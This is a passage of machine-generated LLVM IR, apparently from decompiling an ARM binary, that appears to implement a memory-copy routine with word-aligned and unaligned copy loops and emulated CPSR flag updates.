  store i32 %v1_16f2c, i32* %r2.global-to-local, align 4
  %v3_16f2c = sub i32 31, %v0_16f2c
  %v4_16f2c = and i32 %v3_16f2c, %v0_16f2c
  %v5_16f2c = icmp slt i32 %v4_16f2c, 0
  %v6_16f2c = icmp slt i32 %v1_16f2c, 0
  %v2_16f30 = xor i1 %v6_16f2c, %v5_16f2c
  br i1 %v2_16f30, label %dec_label_pc_16f34, label %dec_label_pc_16f1c.dec_label_pc_16f1c_crit_edge

dec_label_pc_16f1c.dec_label_pc_16f1c_crit_edge:  ; preds = %dec_label_pc_16f1c
  %v0_16f1c.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_16f1c

dec_label_pc_16f34:                               ; preds = %dec_label_pc_16f1c
  %v1_16f34 = add i32 %v0_16f2c, -16
  %v3_16f34 = add i32 %v0_16f2c, 2147483616
  %v4_16f34 = and i32 %v1_16f34, %v3_16f34
  %v5_16f34 = icmp slt i32 %v4_16f34, 0
  store i1 %v5_16f34, i1* %cpsr_v.global-to-local, align 1
  %v6_16f34 = icmp slt i32 %v1_16f34, 0
  store i1 %v6_16f34, i1* %cpsr_n.global-to-local, align 1
  %v7_16f34 = icmp eq i32 %v1_16f34, 0
  store i1 %v7_16f34, i1* %cpsr_z.global-to-local, align 1
  %v2_16f38 = xor i1 %v6_16f34, %v5_16f34
  br i1 %v2_16f38, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_16f34
  %v3_16f38 = load i32, i32* @r1, align 4
  %v4_16f38 = inttoptr i32 %v3_16f38 to i32*
  %v5_16f38 = load i32, i32* %v4_16f38, align 4
  store i32 %v5_16f38, i32* @r3, align 4
  %v6_16f38 = add i32 %v3_16f38, 4
  %v7_16f38 = inttoptr i32 %v6_16f38 to i32*
  %v8_16f38 = load i32, i32* %v7_16f38, align 4
  store i32 %v8_16f38, i32* %r4.global-to-local, align 4
  %v9_16f38 = add i32 %v3_16f38, 8
  %v10_16f38 = inttoptr i32 %v9_16f38 to i32*
  %v11_16f38 = load i32, i32* %v10_16f38, align 4
  store i32 %v11_16f38, i32* @ip, align 4
  %v12_16f38 = add i32 %v3_16f38, 12
  %v13_16f38 = inttoptr i32 %v12_16f38 to i32*
  %v14_16f38 = load i32, i32* %v13_16f38, align 4
  store i32 %v14_16f38, i32* %lr.global-to-local, align 4
  %v15_16f38 = add i32 %v3_16f38, 16
  store i32 %v15_16f38, i32* @r1, align 4
  %v4_16f3c = inttoptr i32 %v12_16f28 to i32*
  store i32 %v5_16f38, i32* %v4_16f3c, align 4
  %v6_16f3c = add i32 %v0_16f20, 36
  %v7_16f3c = inttoptr i32 %v6_16f3c to i32*
  %v8_16f3c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v8_16f3c, i32* %v7_16f3c, align 4
  %v9_16f3c = add i32 %v0_16f20, 40
  %v10_16f3c = inttoptr i32 %v9_16f3c to i32*
  %v11_16f3c = load i32, i32* @ip, align 4
  store i32 %v11_16f3c, i32* %v10_16f3c, align 4
  %v12_16f3c = add i32 %v0_16f20, 44
  %v13_16f3c = inttoptr i32 %v12_16f3c to i32*
  %v14_16f3c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v14_16f3c, i32* %v13_16f3c, align 4
  %v15_16f3c = add i32 %v0_16f20, 48
  store i32 %v15_16f3c, i32* @r0, align 4
  %v3_16f40 = load i32, i32* %r2.global-to-local, align 4
  %v4_16f40 = add i32 %v3_16f40, -16
  store i32 %v4_16f40, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_16f34, %bb136
  %v3_16f50102111 = phi i32 [ %v15_16f3c, %bb136 ], [ %v12_16f28, %dec_label_pc_16f34 ]
  %v0_16f48.pre = phi i32 [ %v4_16f40, %bb136 ], [ %v1_16f2c, %dec_label_pc_16f34 ]
  %v2_16f44 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16f44, i32* @r4, align 4
  br label %dec_label_pc_16f48

dec_label_pc_16f48:                               ; preds = %dec_label_pc_16f10, %bb137
  %v3_16f50101 = phi i32 [ %v0_16f2094, %dec_label_pc_16f10 ], [ %v3_16f50102111, %bb137 ]
  %v0_16f48 = phi i32 [ %v1_16f10, %dec_label_pc_16f10 ], [ %v0_16f48.pre, %bb137 ]
  %v1_16f48 = add i32 %v0_16f48, 20
  store i32 %v1_16f48, i32* %r2.global-to-local, align 4
  %v3_16f48 = sub i32 0, %v0_16f48
  %v4_16f48 = and i32 %v1_16f48, %v3_16f48
  %v5_16f48 = icmp slt i32 %v4_16f48, 0
  store i1 %v5_16f48, i1* %cpsr_v.global-to-local, align 1
  %v6_16f48 = icmp slt i32 %v1_16f48, 0
  store i1 %v6_16f48, i1* %cpsr_n.global-to-local, align 1
  %v7_16f48 = icmp eq i32 %v1_16f48, 0
  store i1 %v7_16f48, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16f4c

dec_label_pc_16f4c:                               ; preds = %.thread115, %dec_label_pc_16f48
  %v0_16f5c.pre157 = phi i32 [ %v0_16f5c.pre, %.thread115 ], [ %v1_16f48, %dec_label_pc_16f48 ]
  %v3_16f50 = phi i32 [ %v3_16f5099116, %.thread115 ], [ %v3_16f50101, %dec_label_pc_16f48 ]
  %v1_16f54 = phi i1 [ %v1_16f58, %.thread115 ], [ %v5_16f48, %dec_label_pc_16f48 ]
  %v0_16f54 = phi i1 [ %v0_16f58, %.thread115 ], [ %v6_16f48, %dec_label_pc_16f48 ]
  %v2_16f4c = xor i1 %v1_16f54, %v0_16f54
  br i1 %v2_16f4c, label %.thread115, label %bb138

bb138:                                            ; preds = %dec_label_pc_16f4c
  %v3_16f4c = load i32, i32* @r1, align 4
  %v4_16f4c = inttoptr i32 %v3_16f4c to i32*
  %v5_16f4c = load i32, i32* %v4_16f4c, align 4
  store i32 %v5_16f4c, i32* @r3, align 4
  %v6_16f4c = add i32 %v3_16f4c, 4
  %v7_16f4c = inttoptr i32 %v6_16f4c to i32*
  %v8_16f4c = load i32, i32* %v7_16f4c, align 4
  store i32 %v8_16f4c, i32* @ip, align 4
  %v9_16f4c = add i32 %v3_16f4c, 8
  %v10_16f4c = inttoptr i32 %v9_16f4c to i32*
  %v11_16f4c = load i32, i32* %v10_16f4c, align 4
  store i32 %v11_16f4c, i32* %lr.global-to-local, align 4
  %v12_16f4c = add i32 %v3_16f4c, 12
  store i32 %v12_16f4c, i32* @r1, align 4
  %v4_16f50 = inttoptr i32 %v3_16f50 to i32*
  store i32 %v5_16f4c, i32* %v4_16f50, align 4
  %v6_16f50 = add i32 %v3_16f50, 4
  %v7_16f50 = inttoptr i32 %v6_16f50 to i32*
  %v8_16f50 = load i32, i32* @ip, align 4
  store i32 %v8_16f50, i32* %v7_16f50, align 4
  %v9_16f50 = add i32 %v3_16f50, 8
  %v10_16f50 = inttoptr i32 %v9_16f50 to i32*
  %v11_16f50 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_16f50, i32* %v10_16f50, align 4
  %v12_16f50 = add i32 %v3_16f50, 12
  store i32 %v12_16f50, i32* @r0, align 4
  %v3_16f54 = load i32, i32* %r2.global-to-local, align 4
  %v4_16f54 = add i32 %v3_16f54, -12
  store i32 %v4_16f54, i32* %r2.global-to-local, align 4
  %v6_16f54 = sub i32 11, %v3_16f54
  %v7_16f54 = and i32 %v6_16f54, %v3_16f54
  %v8_16f54 = icmp slt i32 %v7_16f54, 0
  store i1 %v8_16f54, i1* %cpsr_v.global-to-local, align 1
  %v9_16f54 = icmp slt i32 %v4_16f54, 0
  store i1 %v9_16f54, i1* %cpsr_n.global-to-local, align 1
  %v10_16f54 = icmp eq i32 %v3_16f54, 12
  store i1 %v10_16f54, i1* %cpsr_z.global-to-local, align 1
  br label %.thread115

.thread115:                                       ; preds = %dec_label_pc_16f4c, %bb138
  %v0_16f5c.pre = phi i32 [ %v4_16f54, %bb138 ], [ %v0_16f5c.pre157, %dec_label_pc_16f4c ]
  %v3_16f5099116 = phi i32 [ %v12_16f50, %bb138 ], [ %v3_16f50, %dec_label_pc_16f4c ]
  %v1_16f58 = phi i1 [ %v8_16f54, %bb138 ], [ %v1_16f54, %dec_label_pc_16f4c ]
  %v0_16f58 = phi i1 [ %v9_16f54, %bb138 ], [ %v0_16f54, %dec_label_pc_16f4c ]
  %v2_16f58 = xor i1 %v1_16f58, %v0_16f58
  br i1 %v2_16f58, label %dec_label_pc_16f5c, label %dec_label_pc_16f4c

dec_label_pc_16f5c:                               ; preds = %.thread115, %dec_label_pc_16f08
  %v4_16f6c = phi i32 [ %v0_16f2094, %dec_label_pc_16f08 ], [ %v3_16f5099116, %.thread115 ]
  %v0_16f5c = phi i32 [ %v1_16f08, %dec_label_pc_16f08 ], [ %v0_16f5c.pre, %.thread115 ]
  %v1_16f5c = add i32 %v0_16f5c, 8
  store i32 %v1_16f5c, i32* %r2.global-to-local, align 4
  %v3_16f5c = sub i32 0, %v0_16f5c
  %v4_16f5c = and i32 %v1_16f5c, %v3_16f5c
  %v5_16f5c = icmp slt i32 %v4_16f5c, 0
  store i1 %v5_16f5c, i1* %cpsr_v.global-to-local, align 1
  %v6_16f5c = icmp slt i32 %v1_16f5c, 0
  store i1 %v6_16f5c, i1* %cpsr_n.global-to-local, align 1
  %v7_16f5c = icmp eq i32 %v1_16f5c, 0
  store i1 %v7_16f5c, i1* %cpsr_z.global-to-local, align 1
  %v2_16f60 = xor i1 %v6_16f5c, %v5_16f5c
  br i1 %v2_16f60, label %bb140, label %dec_label_pc_16f64

dec_label_pc_16f64:                               ; preds = %dec_label_pc_16f5c
  %v1_16f64 = add i32 %v0_16f5c, 4
  store i32 %v1_16f64, i32* %r2.global-to-local, align 4
  %v3_16f64 = sub i32 -5, %v0_16f5c
  %v4_16f64 = and i32 %v3_16f64, %v1_16f5c
  %v5_16f64 = icmp slt i32 %v4_16f64, 0
  store i1 %v5_16f64, i1* %cpsr_v.global-to-local, align 1
  %v6_16f64 = icmp slt i32 %v1_16f64, 0
  store i1 %v6_16f64, i1* %cpsr_n.global-to-local, align 1
  %v7_16f64 = icmp eq i32 %v1_16f5c, 4
  store i1 %v7_16f64, i1* %cpsr_z.global-to-local, align 1
  %v2_16f68 = xor i1 %v6_16f64, %v5_16f64
  %v3_16f68 = load i32, i32* @r1, align 4
  %v4_16f68 = inttoptr i32 %v3_16f68 to i32*
  %v5_16f68 = load i32, i32* %v4_16f68, align 4
  store i32 %v5_16f68, i32* @r3, align 4
  %v7_16f68 = add i32 %v3_16f68, 4
  br i1 %v2_16f68, label %.thread122, label %bb139

.thread122:                                       ; preds = %dec_label_pc_16f64
  store i32 %v7_16f68, i32* @r1, align 4
  %v5_16f6c = inttoptr i32 %v4_16f6c to i32*
  store i32 %v5_16f68, i32* %v5_16f6c, align 4
  %v6_16f6c = load i32, i32* @r0, align 4
  %v7_16f6c = add i32 %v6_16f6c, 4
  store i32 %v7_16f6c, i32* @r0, align 4
  %v0_16f7c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb140

bb139:                                            ; preds = %dec_label_pc_16f64
  %v7_16f70 = inttoptr i32 %v7_16f68 to i32*
  %v8_16f70 = load i32, i32* %v7_16f70, align 4
  store i32 %v8_16f70, i32* @ip, align 4
  %v9_16f70 = add i32 %v3_16f68, 8
  store i32 %v9_16f70, i32* @r1, align 4
  %v4_16f74 = inttoptr i32 %v4_16f6c to i32*
  store i32 %v5_16f68, i32* %v4_16f74, align 4
  %v6_16f74 = add i32 %v4_16f6c, 4
  %v7_16f74 = inttoptr i32 %v6_16f74 to i32*
  %v8_16f74 = load i32, i32* @ip, align 4
  store i32 %v8_16f74, i32* %v7_16f74, align 4
  %v9_16f74 = add i32 %v4_16f6c, 8
  store i32 %v9_16f74, i32* @r0, align 4
  %v3_16f78 = load i32, i32* %r2.global-to-local, align 4
  %v4_16f78 = add i32 %v3_16f78, -4
  store i32 %v4_16f78, i32* %r2.global-to-local, align 4
  br label %bb140

bb140:                                            ; preds = %.thread122, %.thread128, %dec_label_pc_16f5c, %bb, %dec_label_pc_1712c, %dec_label_pc_170c0, %dec_label_pc_17054, %bb139
  %v0_16f7c = phi i32 [ %v0_16f7c.pre, %.thread122 ], [ %v2_16fcc, %.thread128 ], [ %v1_16f5c, %dec_label_pc_16f5c ], [ %v2_16ef0, %bb ], [ %v0_16f7c61, %dec_label_pc_1712c ], [ %v0_16f7c60, %dec_label_pc_170c0 ], [ %v0_16f7c59, %dec_label_pc_17054 ], [ %v4_16f78, %bb139 ]
  %v1_16f7c = add i32 %v0_16f7c, 4
  store i32 %v1_16f7c, i32* %r2.global-to-local, align 4
  %v3_16f7c = sub i32 0, %v0_16f7c
  %v4_16f7c = and i32 %v1_16f7c, %v3_16f7c
  %v5_16f7c = icmp slt i32 %v4_16f7c, 0
  store i1 %v5_16f7c, i1* %cpsr_v.global-to-local, align 1
  %v6_16f7c = icmp slt i32 %v1_16f7c, 0
  store i1 %v6_16f7c, i1* %cpsr_n.global-to-local, align 1
  %v7_16f7c = icmp eq i32 %v1_16f7c, 0
  store i1 %v7_16f7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16f7c, label %bb141, label %bb140.bb142_crit_edge

bb140.bb142_crit_edge:                            ; preds = %bb140
  %v0_16f84.pre = load i32, i32* @r3, align 4
  br label %bb142

bb141:                                            ; preds = %bb140
  %v3_16f80 = load i8*, i8** %stack_var_-8, align 4
  %v4_16f80 = ptrtoint i8* %v3_16f80 to i32
  store i32 %v4_16f80, i32* @r0, align 4
  br label %bb142

bb142:                                            ; preds = %bb140.bb142_crit_edge, %bb141
  %v0_16f84 = phi i32 [ %v0_16f84.pre, %bb140.bb142_crit_edge ], [ %v8_16eec, %bb141 ]
  call void @__pseudo_cond_branch(i1 %v7_16f7c, i32 %v0_16f84)
  %v0_16f88 = load i32, i32* %r2.global-to-local, align 4
  %v1_16f88 = add i32 %v0_16f88, -2
  %v3_16f88 = sub i32 1, %v0_16f88
  %v4_16f88 = and i32 %v3_16f88, %v0_16f88
  %v5_16f88 = icmp slt i32 %v4_16f88, 0
  store i1 %v5_16f88, i1* %cpsr_v.global-to-local, align 1
  %v6_16f88 = icmp slt i32 %v1_16f88, 0
  store i1 %v6_16f88, i1* %cpsr_n.global-to-local, align 1
  %v7_16f88 = icmp eq i32 %v0_16f88, 2
  store i1 %v7_16f88, i1* %cpsr_z.global-to-local, align 1
  %v0_16f8c = load i32, i32* @r1, align 4
  %v1_16f8c = inttoptr i32 %v0_16f8c to i8*
  %v2_16f8c = load i8, i8* %v1_16f8c, align 1
  %v5_16f8c = add i32 %v0_16f8c, 1
  store i32 %v5_16f8c, i32* %r1.global-to-local, align 4
  %v2_16f90 = load i32, i32* @r0, align 4
  %v3_16f90 = inttoptr i32 %v2_16f90 to i8*
  store i8 %v2_16f8c, i8* %v3_16f90, align 1
  %v4_16f90 = load i32, i32* @r0, align 4
  %v5_16f90 = add i32 %v4_16f90, 1
  store i32 %v5_16f90, i32* %r0.global-to-local, align 4
  %v0_16f94 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_16f94 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_16f94 = xor i1 %v0_16f94, %v1_16f94
  br i1 %v2_16f94, label %.thread125, label %bb143

bb143:                                            ; preds = %bb142
  %v3_16f94 = load i32, i32* %r1.global-to-local, align 4
  %v4_16f94 = inttoptr i32 %v3_16f94 to i8*
  %v5_16f94 = load i8, i8* %v4_16f94, align 1
  %v8_16f94 = add i32 %v3_16f94, 1
  store i32 %v8_16f94, i32* %r1.global-to-local, align 4
  %v6_16f98 = inttoptr i32 %v5_16f90 to i8*
  store i8 %v5_16f94, i8* %v6_16f98, align 1
  %v7_16f98 = load i32, i32* %r0.global-to-local, align 4
  %v8_16f98 = add i32 %v7_16f98, 1
  store i32 %v8_16f98, i32* %r0.global-to-local, align 4
  %v1_16f9c.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_16f9c.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread125

.thread125:                                       ; preds = %bb142, %bb143
  %v7_16fa0 = phi i32 [ %v8_16f98, %bb143 ], [ %v5_16f90, %bb142 ]
  %v2_16fa0 = phi i1 [ %v2_16f9c.pre, %bb143 ], [ %v1_16f94, %bb142 ]
  %v1_16fa0 = phi i1 [ %v1_16f9c.pre, %bb143 ], [ %v0_16f94, %bb142 ]
  %v0_16f9c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_16f9c = xor i1 %v2_16fa0, %v1_16fa0
  %v4_16f9c = or i1 %v0_16f9c, %v3_16f9c
  br i1 %v4_16f9c, label %.thread126, label %bb144

bb144:                                            ; preds = %.thread125
  %v5_16f9c = load i32, i32* %r1.global-to-local, align 4
  %v6_16f9c = inttoptr i32 %v5_16f9c to i8*
  %v7_16f9c = load i8, i8* %v6_16f9c, align 1
  %v10_16f9c = add i32 %v5_16f9c, 1
  store i32 %v10_16f9c, i32* %r1.global-to-local, align 4
  %v8_16fa0 = inttoptr i32 %v7_16fa0 to i8*
  store i8 %v7_16f9c, i8* %v8_16fa0, align 1
  %v9_16fa0 = load i32, i32* %r0.global-to-local, align 4
  %v10_16fa0 = add i32 %v9_16fa0, 1
  store i32 %v10_16fa0, i32* %r0.global-to-local, align 4
  br label %.thread126

.thread126:                                       ; preds = %.thread125, %bb144
  %v2_16fa4 = load i8*, i8** %stack_var_-8, align 4
  %v3_16fa4 = ptrtoint i8* %v2_16fa4 to i32
  store i32 %v3_16fa4, i32* @r0, align 4
  call void @__pseudo_branch(i32 %v8_16eec)
  %v0_16fac.pre = load i32, i32* @ip, align 4
  %v0_16fb4.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_16fb8.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_16fac

dec_label_pc_16fac:                               ; preds = %dec_label_pc_16ef8, %.thread126
  %v2_16fb8 = phi i32 [ %v1_16ee0, %dec_label_pc_16ef8 ], [ %v2_16fb8.pre, %.thread126 ]
  %v0_16fb4 = phi i32 [ %v0_16ee0, %dec_label_pc_16ef8 ], [ %v0_16fb4.pre, %.thread126 ]
  %v0_16fac = phi i32 [ %v1_16ef8, %dec_label_pc_16ef8 ], [ %v0_16fac.pre, %.thread126 ]
  %v1_16fac = sub i32 4, %v0_16fac
  store i32 %v1_16fac, i32* @ip, align 4
  %v1_16fb0 = add i32 %v1_16fac, -2
  %v3_16fb0 = sub i32 1, %v1_16fac
  %v4_16fb0 = and i32 %v3_16fb0, %v1_16fac
  %v5_16fb0 = icmp slt i32 %v4_16fb0, 0
  store i1 %v5_16fb0, i1* %cpsr_v.global-to-local, align 1
  %v6_16fb0 = icmp slt i32 %v1_16fb0, 0
  store i1 %v6_16fb0, i1* %cpsr_n.global-to-local, align 1
  %v7_16fb0 = icmp eq i32 %v1_16fac, 2
  store i1 %v7_16fb0, i1* %cpsr_z.global-to-local, align 1
  %v1_16fb4 = inttoptr i32 %v0_16fb4 to i8*
  %v2_16fb4 = load i8, i8* %v1_16fb4, align 1
  %v3_16fb4 = zext i8 %v2_16fb4 to i32
  store i32 %v3_16fb4, i32* @r3, align 4
  %v5_16fb4 = add i32 %v0_16fb4, 1
  store i32 %v5_16fb4, i32* @r1, align 4
  %v3_16fb8 = inttoptr i32 %v2_16fb8 to i8*
  store i8 %v2_16fb4, i8* %v3_16fb8, align 1
  %v4_16fb8 = load i32, i32* @r0, align 4
  %v5_16fb8 = add i32 %v4_16fb8, 1
  store i32 %v5_16fb8, i32* @r0, align 4
  %v0_16fbc = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_16fbc = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_16fbc = xor i1 %v0_16fbc, %v1_16fbc
  br i1 %v2_16fbc, label %.thread127, label %bb145

bb145:                                            ; preds = %dec_label_pc_16fac
  %v3_16fbc = load i32, i32* @r1, align 4
  %v4_16fbc = inttoptr i32 %v3_16fbc to i8*
  %v5_16fbc = load i8, i8* %v4_16fbc, align 1
  %v6_16fbc = zext i8 %v5_16fbc to i32
  store i32 %v6_16fbc, i32* @r3, align 4
  %v8_16fbc = add i32 %v3_16fbc, 1
  store i32 %v8_16fbc, i32* @r1, align 4
  %v6_16fc0 = inttoptr i32 %v5_16fb8 to i8*
  store i8 %v5_16fbc, i8* %v6_16fc0, align 1
  %v7_16fc0 = load i32, i32* @r0, align 4
  %v8_16fc0 = add i32 %v7_16fc0, 1
  store i32 %v8_16fc0, i32* @r0, align 4
  %v1_16fc4.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_16fc4.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread127

.thread127:                                       ; preds = %dec_label_pc_16fac, %bb145
  %v7_16fc8 = phi i32 [ %v8_16fc0, %bb145 ], [ %v5_16fb8, %dec_label_pc_16fac ]
  %v2_16fc8 = phi i1 [ %v2_16fc4.pre, %bb145 ], [ %v1_16fbc, %dec_label_pc_16fac ]
  %v1_16fc8 = phi i1 [ %v1_16fc4.pre, %bb145 ], [ %v0_16fbc, %dec_label_pc_16fac ]
  %v0_16fc4 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_16fc4 = xor i1 %v2_16fc8, %v1_16fc8
  %v4_16fc4 = or i1 %v0_16fc4, %v3_16fc4
  br i1 %v4_16fc4, label %.thread128, label %bb146

bb146:                                            ; preds = %.thread127
  %v5_16fc4 = load i32, i32* @r1, align 4
  %v6_16fc4 = inttoptr i32 %v5_16fc4 to i8*
  %v7_16fc4 = load i8, i8* %v6_16fc4, align 1
  %v8_16fc4 = zext i8 %v7_16fc4 to i32
  store i32 %v8_16fc4, i32* @r3, align 4
  %v10_16fc4 = add i32 %v5_16fc4, 1
  store i32 %v10_16fc4, i32* @r1, align 4
  %v8_16fc8 = inttoptr i32 %v7_16fc8 to i8*
  store i8 %v7_16fc4, i8* %v8_16fc8, align 1
  %v9_16fc8 = load i32, i32* @r0, align 4
  %v10_16fc8 = add i32 %v9_16fc8, 1
  store i32 %v10_16fc8, i32* @r0, align 4
  br label %.thread128

.thread128:                                       ; preds = %.thread127, %bb146
  %v0_170fc77 = phi i32 [ %v10_16fc8, %bb146 ], [ %v7_16fc8, %.thread127 ]
  %v0_16fcc = load i32, i32* %r2.global-to-local, align 4
  %v1_16fcc = load i32, i32* @ip, align 4
  %v2_16fcc = sub i32 %v0_16fcc, %v1_16fcc
  store i32 %v2_16fcc, i32* %r2.global-to-local, align 4
  %v4_16fcc = xor i32 %v1_16fcc, %v0_16fcc
  %v5_16fcc = xor i32 %v2_16fcc, %v0_16fcc
  %v6_16fcc = and i32 %v5_16fcc, %v4_16fcc
  %v7_16fcc = icmp slt i32 %v6_16fcc, 0
  store i1 %v7_16fcc, i1* %cpsr_v.global-to-local, align 1
  %v8_16fcc = icmp slt i32 %v2_16fcc, 0
  store i1 %v8_16fcc, i1* %cpsr_n.global-to-local, align 1
  %v9_16fcc = icmp eq i32 %v0_16fcc, %v1_16fcc
  store i1 %v9_16fcc, i1* %cpsr_z.global-to-local, align 1
  %v2_16fd0 = xor i1 %v8_16fcc, %v7_16fcc
  br i1 %v2_16fd0, label %bb140, label %dec_label_pc_16fd4

dec_label_pc_16fd4:                               ; preds = %.thread128
  %v0_16fd4 = load i32, i32* @r1, align 4
  %v1_16fd4 = urem i32 %v0_16fd4, 4
  store i32 %v1_16fd4, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16fd4 = icmp eq i32 %v1_16fd4, 0
  store i1 %v2_16fd4, i1* %cpsr_z.global-to-local, align 1
  %extract.t131 = trunc i32 %v0_16fd4 to i2
  br i1 %v2_16fd4, label %dec_label_pc_16f08, label %dec_label_pc_16fdc

dec_label_pc_16fdc:                               ; preds = %dec_label_pc_16f00, %dec_label_pc_16fd4
  %v0_170fc76 = phi i32 [ %v1_16ee0, %dec_label_pc_16f00 ], [ %v0_170fc77, %dec_label_pc_16fd4 ]
  %v0_17064 = phi i32 [ %v2_16ef0, %dec_label_pc_16f00 ], [ %v2_16fcc, %dec_label_pc_16fd4 ]
  %v0_16fe4.off0 = phi i2 [ %extract.t, %dec_label_pc_16f00 ], [ %extract.t131, %dec_label_pc_16fd4 ]
  %v0_16fdc = phi i32 [ %v0_16ee0, %dec_label_pc_16f00 ], [ %v0_16fd4, %dec_label_pc_16fd4 ]
  %v1_16fdc = and i32 %v0_16fdc, -4
  store i32 %v1_16fdc, i32* %r1.global-to-local, align 4
  %v1_16fe0 = inttoptr i32 %v1_16fdc to i32*
  %v2_16fe0 = load i32, i32* %v1_16fe0, align 4
  store i32 %v2_16fe0, i32* %lr.global-to-local, align 4
  %v4_16fe0 = add i32 %v1_16fdc, 4
  store i32 %v4_16fe0, i32* %r1.global-to-local, align 4
  %v1_1705c = add i32 %v0_17064, -12
  %v3_1705c = sub i32 11, %v0_17064
  %v4_1705c = and i32 %v3_1705c, %v0_17064
  %v5_1705c = icmp slt i32 %v4_1705c, 0
  store i1 %v5_1705c, i1* %cpsr_v.global-to-local, align 1
  %v6_1705c = icmp slt i32 %v1_1705c, 0
  store i1 %v6_1705c, i1* %cpsr_n.global-to-local, align 1
  %v7_1705c = icmp eq i32 %v0_17064, 12
  store i1 %v7_1705c, i1* %cpsr_z.global-to-local, align 1
  %v2_17060 = xor i1 %v6_1705c, %v5_1705c
  switch i2 %v0_16fe4.off0, label %dec_label_pc_16ff0 [
    i2 -1, label %dec_label_pc_170c8
    i2 -2, label %dec_label_pc_1705c
  ]

dec_label_pc_16ff0:                               ; preds = %dec_label_pc_16fdc
  br i1 %v2_17060, label %dec_label_pc_1703c, label %dec_label_pc_16ff8

dec_label_pc_16ff8:                               ; preds = %dec_label_pc_16ff0
  store i32 %v1_1705c, i32* %r2.global-to-local, align 4
  %v3_16ffc = load i32, i32* @r4, align 4
  store i32 %v3_16ffc, i32* %stack_var_-16, align 4
  %v6_16ffc = load i32, i32* @r5, align 4
  store i32 %v6_16ffc, i32* %stack_var_-12, align 4
  br label %dec_label_pc_17000

dec_label_pc_17000:                               ; preds = %dec_label_pc_17000.dec_label_pc_17000_crit_edge, %dec_label_pc_16ff8
  %v0_17024 = phi i32 [ %v12_17024, %dec_label_pc_17000.dec_label_pc_17000_crit_edge ], [ %v0_170fc76, %dec_label_pc_16ff8 ]
  %v0_17004 = phi i32 [ %v0_17004.pre, %dec_label_pc_17000.dec_label_pc_17000_crit_edge ], [ %v4_16fe0, %dec_label_pc_16ff8 ]
  %v0_17000 = phi i32 [ %v0_17000.pre, %dec_label_pc_17000.dec_label_pc_17000_crit_edge ], [ %v2_16fe0, %dec_label_pc_16ff8 ]
  %v3_17000 = udiv i32 %v0_17000, 256
  %v1_17004 = inttoptr i32 %v0_17004 to i32*
  %v2_17004 = load i32, i32* %v1_17004, align 4
  store i32 %v2_17004, i32* %r4.global-to-local, align 4
  %v3_17004 = add i32 %v0_17004, 4
  %v4_17004 = inttoptr i32 %v3_17004 to i32*
  %v5_17004 = load i32, i32* %v4_17004, align 4
  store i32 %v5_17004, i32* %r5.global-to-local, align 4
  %v6_17004 = add i32 %v0_17004, 8
  %v7_17004 = inttoptr i32 %v6_17004 to i32*
  %v8_17004 = load i32, i32* %v7_17004, align 4
  store i32 %v8_17004, i32* %ip.global-to-local, align 4
  %v9_17004 = add i32 %v0_17004, 12
  %v10_17004 = inttoptr i32 %v9_17004 to i32*
  %v11_17004 = load i32, i32* %v10_17004, align 4
  store i32 %v11_17004, i32* %lr.global-to-local, align 4
  %v12_17004 = add i32 %v0_17004, 16
  store i32 %v12_17004, i32* %r1.global-to-local, align 4
  %v4_17008 = mul i32 %v2_17004, 16777216
  %v5_17008 = or i32 %v4_17008, %v3_17000
  store i32 %v5_17008, i32* @r3, align 4
  %v3_1700c = udiv i32 %v2_17004, 256
  %v4_17010 = mul i32 %v5_17004, 16777216
  %v5_17010 = or i32 %v4_17010, %v3_1700c
  store i32 %v5_17010, i32* %r4.global-to-local, align 4
  %v3_17014 = udiv i32 %v5_17004, 256
  %v4_17018 = mul i32 %v8_17004, 16777216
  %v5_17018 = or i32 %v4_17018, %v3_17014
  store i32 %v5_17018, i32* %r5.global-to-local, align 4
  %v3_1701c = udiv i32 %v8_17004, 256
  %v4_17020 = mul i32 %v11_17004, 16777216
  %v5_17020 = or i32 %v4_17020, %v3_1701c
  store i32 %v5_17020, i32* @ip, align 4
  %v1_17024 = inttoptr i32 %v0_17024 to i32*
  store i32 %v5_17008, i32* %v1_17024, align 4
  %v3_17024 = add i32 %v0_17024, 4
  %v4_17024 = inttoptr i32 %v3_17024 to i32*
  %v5_17024 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_17024, i32* %v4_17024, align 4
  %v6_17024 = add i32 %v0_17024, 8
  %v7_17024 = inttoptr i32 %v6_17024 to i32*
  %v8_17024 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_17024, i32* %v7_17024, align 4
  %v9_17024 = add i32 %v0_17024, 12
  %v10_17024 = inttoptr i32 %v9_17024 to i32*
  %v11_17024 = load i32, i32* @ip, align 4
  store i32 %v11_17024, i32* %v10_17024, align 4
  %v12_17024 = add i32 %v0_17024, 16
  store i32 %v12_17024, i32* @r0, align 4
  %v0_17028 = load i32, i32* %r2.global-to-local, align 4
  %v1_17028 = add i32 %v0_17028, -16
  store i32 %v1_17028, i32* %r2.global-to-local, align 4
  %v3_17028 = sub i32 15, %v0_17028
  %v4_17028 = and i32 %v3_17028, %v0_17028
  %v5_17028 = icmp slt i32 %v4_17028, 0
  %v6_17028 = icmp slt i32 %v1_17028, 0
  %v2_1702c = xor i1 %v6_17028, %v5_17028
  br i1 %v2_1702c, label %dec_label_pc_17030, label %dec_label_pc_17000.dec_label_pc_17000_crit_edge
